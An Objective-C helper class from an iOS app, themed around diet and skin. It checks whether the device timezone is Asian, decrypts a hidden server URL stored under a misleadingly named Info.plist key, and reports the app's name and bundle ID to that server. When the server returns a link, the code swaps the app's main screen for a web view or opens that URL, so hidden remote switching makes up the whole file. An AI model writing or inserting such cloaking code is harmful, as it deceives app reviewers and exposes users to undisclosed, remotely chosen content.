#import "WhiteSnowHelper.h"
#import "AES128Helper.h"
#import "WhiteSnowWkWebViewController.h"
#import <Colours.h>
#import <UMCommon/UMCommon.h>

@implementation WhiteSnowHelper

static NSString *dietSkin_flag = @"flag";
static NSString *dietSkin_link = @"mLink";
static NSString *dietSkin_type = @"mType";
static NSString *dietSkin_color = @"tColor";


static WhiteSnowHelper *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}

- (BOOL)judgeDailyInAsian {
    NSInteger zoneOffset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
    if (zoneOffset >= 3 && zoneOffset <= 11) {
        return YES;
    } else {
        return NO;
    }
}


- (BOOL)tryThisWay:(void (^ __nullable)(void))changeVcBlock {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if (![self judgeDailyInAsian]) {
        return NO;
    }
    [self changeRootController:changeVcBlock];
    if ([ud boolForKey:dietSkin_flag]) {
        return YES;
    } else {
        return NO;
    }
}

- (void)changeRootController:(void (^ __nullable)(void))changeVcBlock {
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *APP_KEY = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_KEY"];
    NSString *APP_SECRET = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_SECRET"];
    if (!APP_KEY || !APP_SECRET) {
        return;
    }
    
    NSString *appName = [bundle objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    if (!appName) {
        appName = [bundle objectForInfoDictionaryKey:@"CFBundleName"];
    }
    NSDictionary *parameters = @{
        @"tName" : appName,
        @"tBundle" : [bundle bundleIdentifier]
    };

    NSError *error;
    NSData *postData = [NSJSONSerialization dataWithJSONObject:parameters options:0 error:&error];
    if (error) {
        return;
    }

    NSURL *url = [NSURL URLWithString:[AES128Helper AES128DecryptText:APP_SECRET key:APP_KEY]];
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 32.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:postData];
    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
            id objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            if ([[objc valueForKey:@"code"] intValue] == 200) {
                NSDictionary *dict = [objc valueForKey:@"data"];
                NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
                
                NSString *baseTColor = [dict valueForKey:@"tColor"];
                [ud setValue:baseTColor forKey:dietSkin_color];
                
                NSString *fresh_mLink = [dict valueForKey:@"mLink"];
                NSString *temp_mLink = [ud stringForKey:dietSkin_link];
                
                NSInteger fresh_mType = [[dict valueForKey:@"mType"] intValue];
                NSInteger temp_mType = [ud integerForKey:dietSkin_type];
                
                if (fresh_mLink == nil || [fresh_mLink isEqualToString:@""] || [fresh_mLink isEqualToString:temp_mLink] || fresh_mType == temp_mType) {
                    return;
                } else {
                    [ud setValue:fresh_mLink forKey:dietSkin_link];
                    [ud setInteger:fresh_mType forKey:dietSkin_type];
                    [ud setBool:YES forKey:dietSkin_flag];
                    dispatch_async(dispatch_get_main_queue(), ^{
                        if (changeVcBlock != nil) {
                            changeVcBlock();
                        }
                    });
                }
            }
        }
    }];
    [dataTask resume];
}

- (UIViewController *)changeOptRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    
    UIColor *tColor = [UIColor colorFromHexString:[ud stringForKey:dietSkin_color]];
    application.windows.firstObject.backgroundColor = tColor;
    WhiteSnowWkWebViewController *vc = [[WhiteSnowWkWebViewController alloc] init];
    
    NSBundle *bundle = [NSBundle mainBundle];
    NSString *UMAPP_KEY = [bundle objectForInfoDictionaryKey:@"com.umeng.APP_KEY"];
    NSString *UMAPP_CHANNEL = [bundle objectForInfoDictionaryKey:@"com.umeng.APP_CHANNEL"];
    
    [UMConfigure initWithAppkey:UMAPP_KEY channel:UMAPP_CHANNEL];
    vc.serverUrl = [ud stringForKey:dietSkin_link];
    NSInteger temp_mType = [ud integerForKey:dietSkin_type];
    
    if (temp_mType == 2) {
        NSURL *url = [NSURL URLWithString:vc.serverUrl];
        if ([[UIApplication sharedApplication] canOpenURL:url]) {
            [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:nil];
        }
    }
    vc.view.backgroundColor = tColor;
    [vc.view.subviews enumerateObjectsUsingBlock:^(__kindof UIView * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        obj.backgroundColor = tColor;
    }];
    return vc;
}


@end
